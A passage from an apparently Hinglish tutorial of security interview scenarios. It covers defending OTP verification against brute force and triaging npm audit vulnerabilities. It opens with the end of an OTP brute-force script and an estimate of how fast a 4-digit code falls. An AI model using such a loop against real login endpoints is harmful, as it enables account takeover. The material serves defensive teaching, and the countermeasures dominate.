        return otpString;
      }
    } catch (err) {
      // 429 Too Many Requests = rate limited (good defense)
      continue;
    }
  }
};

// Agar koi protection nahi hai:
// 10,000 requests / ~100 req per second = ~100 seconds mein crack!
```

### Comprehensive Solution:

**Layer 1: Rate Limiting (First Defense)**

```js
const rateLimit = require("express-rate-limit");

// OTP verification ke liye strict rate limit
const otpVerifyLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // sirf 5 attempts per 15 min
  message: {
    error: "Too many OTP attempts. Please try again after 15 minutes.",
  },
  keyGenerator: (req) => {
    // IP + phone number combination se limit karo
    return `otp_${req.ip}_${req.body.phone}`;
  },
  standardHeaders: true,
  legacyHeaders: false,
});

// OTP send karne pe bhi limit
const otpSendLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 3,                     // 3 OTPs per hour
  message: { error: "Too many OTP requests. Try again later." },
  keyGenerator: (req) => `send_${req.ip}_${req.body.phone}`,
});

app.post("/api/send-otp", otpSendLimiter, sendOTP);
app.post("/api/verify-otp", otpVerifyLimiter, verifyOTP);
```

**Layer 2: Max Attempts then Regenerate OTP**

```js
const Redis = require("ioredis");
const redis = new Redis();

const sendOTP = async (req, res) => {
  const { phone } = req.body;

  // 6-digit OTP generate karo (not 4!)
  const otp = crypto.randomInt(100000, 999999).toString(); // 100000-999999

  // Redis mein store karo with metadata
  await redis.setex(
    `otp:${phone}`,
    300, // 5 minutes expiry
    JSON.stringify({
      otp,
      attempts: 0,
      maxAttempts: 3,
      createdAt: Date.now(),
    })
  );

  // SMS bhejo (don't reveal OTP in response)
  await sendSMS(phone, `Your OTP is: ${otp}`);

  res.json({ message: "OTP sent successfully", expiresIn: 300 });
};

const verifyOTP = async (req, res) => {
  const { phone, otp } = req.body;

  // Redis se OTP data fetch karo
  const data = await redis.get(`otp:${phone}`);
  if (!data) {
    return res.status(400).json({ error: "OTP expired or not found. Request a new one." });
  }

  const otpData = JSON.parse(data);

  // Max attempts check
  if (otpData.attempts >= otpData.maxAttempts) {
    // OTP delete karo - naya request karna padega
    await redis.del(`otp:${phone}`);
    return res.status(429).json({
      error: "Maximum OTP attempts exceeded. Please request a new OTP.",
    });
  }

  // Attempt count increment karo (BEFORE checking OTP)
  otpData.attempts += 1;
  const remainingTTL = await redis.ttl(`otp:${phone}`);
  await redis.setex(`otp:${phone}`, remainingTTL, JSON.stringify(otpData));

  // OTP match check (timing-safe comparison)
  if (!crypto.timingSafeEqual(Buffer.from(otp), Buffer.from(otpData.otp))) {
    const remaining = otpData.maxAttempts - otpData.attempts;
    return res.status(400).json({
      error: `Invalid OTP. ${remaining} attempt(s) remaining.`,
    });
  }

  // OTP matched - delete it (one-time use)
  await redis.del(`otp:${phone}`);

  // Proceed with verification
  res.json({ success: true, message: "OTP verified successfully" });
};
```

**Layer 3: Exponential Backoff**

```js
// Har failed attempt ke baad wait time exponentially badhao
const verifyWithBackoff = async (req, res) => {
  const { phone, otp } = req.body;

  // Check: kya user ko abhi wait karna chahiye?
  const lockKey = `otp_lock:${phone}`;
  const lockData = await redis.get(lockKey);

  if (lockData) {
    const { lockedUntil } = JSON.parse(lockData);
    if (Date.now() < lockedUntil) {
      const waitSeconds = Math.ceil((lockedUntil - Date.now()) / 1000);
      return res.status(429).json({
        error: `Please wait ${waitSeconds} seconds before trying again.`,
      });
    }
  }

  // OTP verify karo...
  const isValid = await verifyOTPInternal(phone, otp);

  if (!isValid) {
    // Exponential backoff set karo
    const failKey = `otp_fails:${phone}`;
    const failures = parseInt((await redis.get(failKey)) || "0") + 1;
    await redis.setex(failKey, 3600, failures.toString()); // 1 hour window

    // Wait time: 2^(failures-1) seconds
    // Attempt 1: 1 sec
    // Attempt 2: 2 sec
    // Attempt 3: 4 sec
    // Attempt 4: 8 sec
    // Attempt 5: 16 sec ... aur aage
    const waitTime = Math.min(Math.pow(2, failures - 1), 300) * 1000; // max 5 min

    await redis.setex(
      lockKey,
      Math.ceil(waitTime / 1000),
      JSON.stringify({ lockedUntil: Date.now() + waitTime })
    );

    return res.status(400).json({
      error: "Invalid OTP",
      retryAfter: Math.ceil(waitTime / 1000),
    });
  }

  // Success - cleanup
  await redis.del(`otp_fails:${phone}`);
  await redis.del(`otp_lock:${phone}`);

  res.json({ success: true });
};
```

**Layer 4: Account Lockout for Suspicious Activity**

```js
// Agar bahut zyada failed attempts hain -> account temporarily lock karo
const MAX_DAILY_FAILURES = 10;

const checkAccountLock = async (req, res, next) => {
  const { phone } = req.body;
  const dailyFailKey = `daily_fails:${phone}`;

  const dailyFails = parseInt((await redis.get(dailyFailKey)) || "0");

  if (dailyFails >= MAX_DAILY_FAILURES) {
    // Alert admin
    await notifyAdmin(`Suspicious OTP activity on ${phone}`);

    return res.status(423).json({
      error: "Account temporarily locked due to suspicious activity. Contact support.",
    });
  }

  next();
};

// Failed attempt pe daily counter increment karo
const incrementDailyFails = async (phone) => {
  const key = `daily_fails:${phone}`;
  const current = await redis.incr(key);

  if (current === 1) {
    // First failure today - set 24hr expiry
    await redis.expire(key, 86400);
  }
};
```

### 6 Digits vs 4 Digits:

```
4-digit OTP: 10,000 combinations
  -> 5 attempts mein guess probability: 5/10,000 = 0.05%
  -> Still LOW but not great

6-digit OTP: 1,000,000 combinations
  -> 5 attempts mein guess probability: 5/1,000,000 = 0.0005%
  -> MUCH better!

  -> With rate limiting + max 3 attempts + exponential backoff:
     Brute force practically IMPOSSIBLE
```

### Common Mistakes:

```js
// MISTAKE 1: OTP ko response mein bhejana (testing mein bhool jaate hain)
res.json({ message: "OTP sent", otp: generatedOTP }); // NEVER in production!

// MISTAKE 2: OTP expiry na lagana
// 5 minute se zyada valid nahi hona chahiye

// MISTAKE 3: OTP reuse allow karna
// Ek baar verify hone ke baad DELETE karo

// MISTAKE 4: Predictable OTP generation
const otp = Math.floor(Math.random() * 10000); // Math.random is NOT cryptographically secure
const otp = crypto.randomInt(100000, 999999);   // Use crypto module

// MISTAKE 5: Same OTP baar baar bhejana on resend
// Har resend pe NAYA OTP generate karo, purana invalidate karo

// MISTAKE 6: IP-based rate limiting only
// Attacker distributed IPs (botnet) se aayega -> per-phone limit bhi lagao
```

### Why This Works:
- **Rate limiting** - Automated scripts block ho jaayengi
- **Max 3 attempts** - 3 galat ke baad naya OTP lena padega
- **6 digits** - 1 million combinations = brute force mein years lagenge
- **Exponential backoff** - Har failure ke baad wait time double = script slow ho jaayegi
- **Account lockout** - Persistent attackers bhi block ho jaayenge


---


## Scenario 12: Dependency Vulnerability

**Q: `npm audit` mein 15 critical vulnerabilities dikh rahi hain. Kya karoge? Sab update kar dein?**

**A:** **Blindly sab update karna RISKY hai** - breaking changes aa sakte hain, application crash ho sakti hai. Lekin vulnerabilities ignore karna bhi DANGEROUS hai. Isko systematically handle karna padta hai.

### Step 1: Understand the Problem

```js
// npm audit run karo
// $ npm audit

// Output example:
// ┌───────────────┬──────────────────────────────────────────────────────────────┐
// │ Critical       │ Prototype Pollution in lodash                               │
// ├───────────────┼──────────────────────────────────────────────────────────────┤
// │ Package        │ lodash                                                       │
// │ Versions       │ < 4.17.21                                                    │
// │ Patched in     │ >= 4.17.21                                                   │
// │ Dependency of  │ your-app                                                     │
// │ Path           │ your-app > some-package > lodash                             │
// │ More info      │ https://github.com/advisories/GHSA-xxxx                     │
// └───────────────┴──────────────────────────────────────────────────────────────┘
// found 15 vulnerabilities (3 low, 5 moderate, 5 high, 2 critical)

// Detailed JSON output:
// $ npm audit --json > audit-report.json
```

### Step 2: Categorize and Prioritize

```js
// Vulnerability types by severity:
// CRITICAL: Remote Code Execution, SQL injection
//   -> IMMEDIATELY fix karo
// HIGH: XSS, CSRF, Denial of Service
//   -> Jaldi fix karo (same sprint)
// MODERATE: Information disclosure, timing attacks
//   -> Plan karke fix karo (next sprint)
// LOW: Theoretical attacks, unlikely scenarios
//   -> Track karo, convenience pe fix karo

// Check: kya vulnerability actually affect karti hai?
// Direct dependency vs transitive (nested) dependency
// Server-side code vs build-only tool
// Is the vulnerable function actually used in your code?
```

### Step 3: Safe Fix Approach

```js
// APPROACH 1: npm audit fix (safe - sirf semver-compatible updates)
// $ npm audit fix
// Yeh sirf minor/patch updates karega (1.2.3 -> 1.2.4)
// Breaking changes NAHI aayenge
// Usually safe hai - most vulnerabilities yahan fix ho jaayengi

// APPROACH 2: Check specific package
// $ npm ls lodash
// Dekho lodash kahan kahan use ho raha hai

// APPROACH 3: Manual update for specific packages
// $ npm update lodash
// $ npm install lodash@latest

// APPROACH 4: Force major version updates (CAREFUL!)
// $ npm audit fix --force
// ⚠️ WARNING: Yeh breaking changes la sakta hai
// Major version updates karega (1.x -> 2.x)
// Pehle testing environment mein karo!
```

### Step 4: Handle Breaking Changes

```js
// Scenario: express 4.x -> 5.x major update needed

// Step 1: PEHLE changelog padho
// https://github.com/expressjs/express/blob/master/History.md

// Step 2: Branch bana ke update karo
// $ git checkout -b fix/dependency-updates

// Step 3: Ek ek package update karo (sab ek saath NAHI)
// $ npm install express@latest

// Step 4: Tests run karo
// $ npm test
// $ npm run test:integration

// Step 5: Check for deprecation warnings
// $ node app.js 2>&1 | grep -i deprecat

// Step 6: Agar kuch toota hai, fix karo ya rollback
// $ git stash (ya git checkout package.json package-lock.json)
```

### Step 5: Package Overrides (Transitive Dependency Fix)

```js
// Agar vulnerability nested dependency mein hai
// aur direct dependency ne update nahi kiya

// package.json mein overrides use karo (npm 8.3+)
{
  "name": "my-app",
  "dependencies": {
    "some-package": "^2.0.0"  // yeh internally lodash 4.17.15 use karta hai
  },
  "overrides": {
    "lodash": "^4.17.21"      // force specific version
  }
}

// Ya specific package ke andar override:
{
  "overrides": {
    "some-package": {
      "lodash": "^4.17.21"
    }
  }
}

// Note: overrides cautiously use karo - compatibility issues aa sakte hain
// Test thoroughly after adding overrides
```

### Step 6: Automated Monitoring Setup

```js
// OPTION 1: GitHub Dependabot (FREE!)
// .github/dependabot.yml
// (create this file in your repo)
```

```js
// .github/dependabot.yml content:
// version: 2
// updates:
//   - package-ecosystem: "npm"
//     directory: "/"
//     schedule:
//       interval: "weekly"
//     open-pull-requests-limit: 10
//     reviewers:
//       - "your-username"
//     labels:
//       - "dependencies"
//     ignore:
//       - dependency-name: "aws-sdk"     # heavy package, manual updates
//         update-types: ["version-update:semver-major"]

// Dependabot will automatically:
// - Weekly check for updates
// - Create PRs with changelogs
// - Run your CI tests on the PR
```

```js
// OPTION 2: Snyk (more features)
// $ npm install -g snyk
// $ snyk auth
// $ snyk test

// Snyk gives you:
// - Detailed vulnerability explanations
// - Fix recommendations
// - License compliance checking
// - Container scanning too

// CI/CD mein integrate karo:
// $ snyk test --severity-threshold=high
// Exit code 1 agar high/critical vulnerabilities hain -> build fail

// OPTION 3: npm audit in CI pipeline
// package.json scripts mein:
{
  "scripts": {
    "pretest": "npm audit --audit-level=high",
    "test": "jest",
    "security-check": "npm audit --json | node scripts/check-audit.js"
  }
}
```

### Step 7: Lockfile Importance

```js
// package-lock.json KABHI .gitignore mein mat daalo!

// WHY lockfile matters:
// package.json: "lodash": "^4.17.0"  -> 4.17.0 to 4.17.99 kuch bhi install ho sakta
// package-lock.json: "lodash": "4.17.21" -> EXACT yahi version install hoga

// Bina lockfile:
// Developer A: npm install -> lodash 4.17.15 (vulnerable!)
// Developer B: npm install -> lodash 4.17.21 (patched)
// CI Server:   npm install -> lodash 4.17.19 (different again!)
// "It works on my machine" situation!

// With lockfile:
// EVERYONE gets exact same versions -> consistent, reproducible

// CI mein ALWAYS use:
// $ npm ci (not npm install)
// npm ci:
//   - Deletes node_modules
//   - Installs EXACTLY what's in package-lock.json
//   - Faster than npm install
//   - Fails if package-lock.json is out of sync with package.json
```

### Step 8: Security Best Practices for Dependencies

```js
// 1. Use ONLY what you need
// DON'T: npm install lodash (500KB) for one function
// DO:    npm install lodash.get (2KB) or write it yourself

// 2. Check package health before installing
// $ npm info <package> - check downloads, maintenance, last publish
// Check: GitHub stars, issues, last commit date, maintainers

// 3. Lock specific versions for critical packages
{
  "dependencies": {
    "express": "4.18.2",      // exact version (no ^)
    "mongoose": "~7.6.0"      // minor updates only (~)
  }
}

// 4. Regularly review what you've installed
// $ npm ls --depth=0         // direct dependencies
// $ npx depcheck             // find unused dependencies

// 5. Use .npmrc for security settings
// .npmrc file:
// audit=true                 // auto audit on install
// fund=false                 // skip funding messages
// save-exact=true            // always save exact versions
// engine-strict=true         // enforce node version
```

### Common Mistakes:

```js
// MISTAKE 1: npm audit fix --force blindly run karna
// Major version updates break things! Test pehle karo!

// MISTAKE 2: Lockfile ko gitignore mein daalna
// .gitignore mein package-lock.json NAHI hona chahiye
// (yarn.lock bhi commit karo agar yarn use kar rahe ho)

// MISTAKE 3: Vulnerabilities ignore karna
// "Development dependency hai, production mein nahi hai"
// Lekin CI/CD mein hai -> supply chain attack possible

// MISTAKE 4: Har warning ko blindly fix karna
// Kuch warnings false positives hoti hain
// Ya vulnerability sirf specific use case mein applicable hoti hai
// ASSESS karo -> prioritize karo -> fix karo

// MISTAKE 5: Dependencies ek baar install karke bhool jaana
// Monthly audit schedule banao
// Dependabot/Snyk setup karo for automated alerts
```

### Quick Decision Framework:

```
npm audit results aaye:

1. CRITICAL vulnerability in DIRECT dependency?
   -> Immediately update. If breaking, allocate time NOW.

2. HIGH vulnerability in DIRECT dependency?
   -> Update this sprint. Run tests.

3. Vulnerability in DEV-ONLY dependency?
   -> Lower priority but still fix. Build tools can be attack vectors.

4. Vulnerability in TRANSITIVE (nested) dependency?
   -> Use "overrides" in package.json, or wait for parent package update.

5. No fix available yet?
   -> Check if vulnerability is exploitable in YOUR use case.
   -> Consider alternative package.
   -> Monitor for fix release.
```

### Why This Works:
- **Systematic approach** - Blindly update nahi, assess-prioritize-fix karo
- **npm audit fix** (without --force) safe hai for semver-compatible updates
- **Lockfile** ensures sab ke paas same versions hain
- **Automated tools** (Dependabot/Snyk) continuously monitor karte hain
- **Overrides** let you fix transitive dependencies without waiting


*Total: 12 Security Scenario Questions*
